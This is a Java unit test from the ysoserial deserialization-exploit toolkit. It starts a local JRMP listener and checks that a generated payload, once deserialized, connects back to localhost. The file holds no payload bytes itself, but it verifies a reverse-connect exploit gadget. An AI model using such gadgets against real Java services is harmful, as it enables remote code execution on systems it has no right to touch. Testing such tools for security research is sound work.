/**
 * © 2016 AgNO3 Gmbh & Co. KG
 * All right reserved.
 * 
 * Created: 05.03.2016 by mbechler
 */
package ysoserial.payloads;

import java.io.IOException;
import java.util.Random;
import java.util.concurrent.Callable;

import javax.management.BadAttributeValueExpException;

import org.junit.Assert;

import ysoserial.CustomTest;
import ysoserial.exploit.JRMPListener;

/**
 * @author mbechler
 *
 */
public class JRMPReverseConnectTest implements CustomTest {

    private int port;
    
    
    /**
     * 
     */
    public JRMPReverseConnectTest () {
        port = new Random().nextInt(65535 - 1024) + 1024;
    }

    /**
      * {@inheritDoc}
     * @throws IOException 
     * @throws NumberFormatException 
      *
      * @see java.lang.Runnable#run()
      */
    public void run (Callable<Object> payload) throws Exception {
        JRMPListener l = new JRMPListener(port, new BadAttributeValueExpException("foo"));
        Thread t = new Thread(l, "JRMP listener");
        try {
            t.start();
            payload.call();
            Assert.assertTrue("Did not have connection", l.waitFor(1000));
        } finally {
            l.close();
            t.interrupt();
            t.join();
        }
    }

    /**
      * {@inheritDoc}
      *
      * @see ysoserial.CustomTest#getPayloadArgs()
      */
    public String getPayloadArgs () {
        return "localhost:" + port;
    }

}
